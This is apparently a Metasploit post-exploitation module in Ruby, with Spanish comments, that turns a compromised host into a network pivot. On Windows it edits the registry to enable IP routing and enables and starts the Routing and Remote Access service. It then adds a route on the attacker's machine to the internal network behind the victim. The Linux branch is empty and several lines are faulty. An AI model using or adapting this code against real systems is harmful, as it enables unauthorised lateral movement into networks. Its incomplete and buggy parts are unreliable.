##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Automatic Pivoting',
        'Description'   => %q{Configura el equipo como pivot entre dos o mas redes. Funciona para equipos Windows y Linux. Es necesario tener privilegios de administrador.},
        'License'       => MSF_LICENSE,
        'Author'        => 
           [
             'none',
             'none <none[at]gmail.com>'
           ],
		'Platform'      => [ 'win', 'linux'],
        'SessionTypes'  => [ 'meterpreter','shell']
      ))

    register_options(
      [
		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
		OptString.new('NET',    [true, 'Red que pretendemos alcanzar (Ej: 10.0.0.0/24)']),
		OptString.new('RHOST',    [true, 'IP de la maquina PIVOT (nuestra red)'])
      ])
  end
	#Obtenemos el OS de instalacion de metasploit
	def sistema_base?
		if (Msf::Config.local_directory[0,1])==("/")
			return "linux"
			print_good("soy linux")
		elsif ((Msf::Config.local_directory[0,1])=~ /[[:alpha:]]/)
			return "windows"
		else
			return "unknown"
		end
	end
	#
  	# comandos para linux
  	#
	def linux_pivot()

	end
	#
  	# comandos para windows
  	#
	def windows_pivot()
		print_status("Enabling IP Router...")
		print_good(cmd_exec("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1"))
		print_status("Enabling Routing and Remote Access service...")
		print_good(cmd_exec("sc config RemoteAccess start= auto"))
		print_status("Starting Routing and Remote Access service...")
		print_good(cmd_exec("net start RemoteAccess"))
	end
	#
  	# acciones segun eleccion plataforma
  	#
	def set_pivot()
		case session.platform
	  	when 'linux'
		  	# codigo para linux
		  	linux_pivot()
		when 'windows'
		  	# codigo para windows
			windows_pivot()
		end
	end
	
	#conversion cidr a netmask
	def cidr_to_netmask(cidr)
	  IPAddr.new('255.255.255.255').mask(cidr).to_s
	end
	
	def create_route()
	# Crea la ruta en la máquina local
	# Obtenemos sistema local:
		print_status("Add ruta al la red objetivo...")
		case sistema_base?
	  	when 'linux'
		  	if system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
				print_good("Ruta local instalada")
			else
				print_bad("Algo fallo al instalar la ruta local.")
			end
		when 'windows'
		  	# codigo para windows conversion con variables de cidr a netmask y extraccion de red
			network = datastore['NET'].split("/").first
			netmask = cidr_to_netmask(datastore['NET'].split("/").last)
		  	if system("route -p add #{network} mask #{netmask} METRIC 1")
				print_good("Ruta instalada")
			else
				print_bad("Algo fallo al instalar la ruta.")
			end
		end
	end
	
	#
  	# funcion principal, donde se invocan las otras segun plataforma
  	#
	def run
		# rra_status = --> Estado inicial del servicio RRA
		# iprouting_status = --> Valor inicial del registro IPEnableRouter
		# print_status("Initial values:")
		# print_line("	El servicio RRA se encuentra #{rra_status}")
		# print_line("	El valor de IPEnableRouter es #{iprouting_status}")
		print_status("OS: #{session.sys.config.sysinfo['OS']}")
		print_status("Computer name: #{'Computer'} ")
		print_status("Current user: #{session.sys.config.getuid}")
		set_pivot()
		create_route()
  end
end
